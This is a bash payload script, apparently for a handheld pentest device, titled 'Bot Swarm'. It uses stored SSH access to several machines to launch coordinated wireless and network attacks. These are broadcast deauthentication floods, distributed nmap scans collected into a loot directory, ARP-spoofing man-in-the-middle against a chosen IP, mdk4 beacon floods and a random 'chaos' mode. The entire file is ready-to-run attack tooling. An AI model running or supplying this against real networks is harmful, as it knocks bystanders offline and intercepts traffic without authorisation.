#!/bin/bash
# Title: Bot Swarm
# Author: bad-antics
# Description: Multi-device coordinated attack swarm using mesh network
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/botswarm"
mkdir -p "$LOOT_DIR"

PROMPT "BOT SWARM

Coordinated multi-device
attack orchestration.

Uses mesh-connected
devices as swarm nodes.

Capabilities:
- Distributed deauth
- Coordinated scanning
- Multi-angle MITM
- Swarm recon
- Synchronized chaos

Press OK to configure."

MESH_NODES=()
if [ -f "$HOME/.config/nullsec-link/config.sh" ]; then
    source "$HOME/.config/nullsec-link/config.sh" 2>/dev/null
    for name in $(echo "${!MACHINES[@]}" | tr " " "\n"); do
        IP=$(echo "${MACHINES[$name]}" | cut -d"|" -f1)
        USER=$(echo "${MACHINES[$name]}" | cut -d"|" -f2)
        if ssh -o BatchMode=yes -o ConnectTimeout=3 "${USER}@${IP}" "echo ok" &>/dev/null; then
            MESH_NODES+=("${USER}@${IP}")
        fi
    done
fi

NODE_COUNT=${#MESH_NODES[@]}

PROMPT "SWARM STATUS

Nodes online: $((NODE_COUNT + 1))
(includes this device)

Attack modes:
1. Distributed deauth
2. Swarm scan
3. Multi-MITM
4. Beacon flood (all)
5. Chaos mode

Select on next screen."

ATTACK=$(NUMBER_PICKER "Attack (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK=1 ;; esac

DURATION=$(NUMBER_PICKER "Duration (sec):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "LAUNCH SWARM?

Nodes: $((NODE_COUNT + 1))
Attack: $ATTACK
Duration: ${DURATION}s

THIS WILL BE LOUD.
Press OK to swarm.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "BotSwarm: attack=$ATTACK nodes=$((NODE_COUNT+1)) dur=${DURATION}s"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SPINNER_START "Swarming..."

case $ATTACK in
    1) # Distributed deauth - each node targets different channels
        CH=1
        for node in "${MESH_NODES[@]}"; do
            ssh -o BatchMode=yes "$node" "timeout $DURATION aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF wlan0 &>/dev/null" &
            CH=$((CH + 5))
        done
        timeout "$DURATION" aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF wlan0 &>/dev/null
        ;;
    2) # Swarm scan - each node scans different subnet range
        SUBNET=$(ip -4 addr show | grep -oP "(\d+\.){3}" | head -1)
        CHUNK=$((256 / (NODE_COUNT + 1)))
        START=1
        for node in "${MESH_NODES[@]}"; do
            END=$((START + CHUNK - 1))
            ssh -o BatchMode=yes "$node" "nmap -sV ${SUBNET}${START}-${END} -T4 -oN /tmp/swarm_scan.txt" &>/dev/null &
            START=$((END + 1))
        done
        nmap -sV "${SUBNET}${START}-254" -T4 -oN "$LOOT_DIR/swarm_local_${TIMESTAMP}.txt" 2>/dev/null
        sleep 5
        for node in "${MESH_NODES[@]}"; do
            scp -q "${node}:/tmp/swarm_scan.txt" "$LOOT_DIR/swarm_${node##*@}_${TIMESTAMP}.txt" 2>/dev/null
        done
        ;;
    3) # Multi-MITM
        GATEWAY=$(ip route | grep default | awk "{print \$3}")
        TARGET=$(TEXT_PICKER "Target IP:" "")
        for node in "${MESH_NODES[@]}"; do
            ssh -o BatchMode=yes "$node" "echo 1 > /proc/sys/net/ipv4/ip_forward; timeout $DURATION arpspoof -i wlan0 -t $TARGET $GATEWAY &>/dev/null" &
        done
        echo 1 > /proc/sys/net/ipv4/ip_forward
        timeout "$DURATION" arpspoof -i wlan0 -t "$TARGET" "$GATEWAY" &>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        for node in "${MESH_NODES[@]}"; do
            ssh -o BatchMode=yes "$node" "echo 0 > /proc/sys/net/ipv4/ip_forward" 2>/dev/null
        done
        ;;
    4) # Beacon flood from all nodes
        for node in "${MESH_NODES[@]}"; do
            ssh -o BatchMode=yes "$node" "timeout $DURATION mdk4 wlan0 b -c 1 &>/dev/null" &
        done
        timeout "$DURATION" mdk4 wlan0 b -c 6 &>/dev/null
        ;;
    5) # Chaos - random attacks from all nodes
        for node in "${MESH_NODES[@]}"; do
            ssh -o BatchMode=yes "$node" "
                R=\$((RANDOM % 3))
                case \$R in
                    0) timeout $DURATION aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF wlan0 &>/dev/null ;;
                    1) timeout $DURATION mdk4 wlan0 b &>/dev/null ;;
                    2) timeout $DURATION mdk4 wlan0 a &>/dev/null ;;
                esac
            " &
        done
        timeout "$DURATION" mdk4 wlan0 d &>/dev/null
        ;;
esac

wait
SPINNER_STOP

PROMPT "SWARM COMPLETE

Attack: $ATTACK
Nodes: $((NODE_COUNT + 1))
Duration: ${DURATION}s

All nodes stood down.
Logs in botswarm/

Press OK to exit."
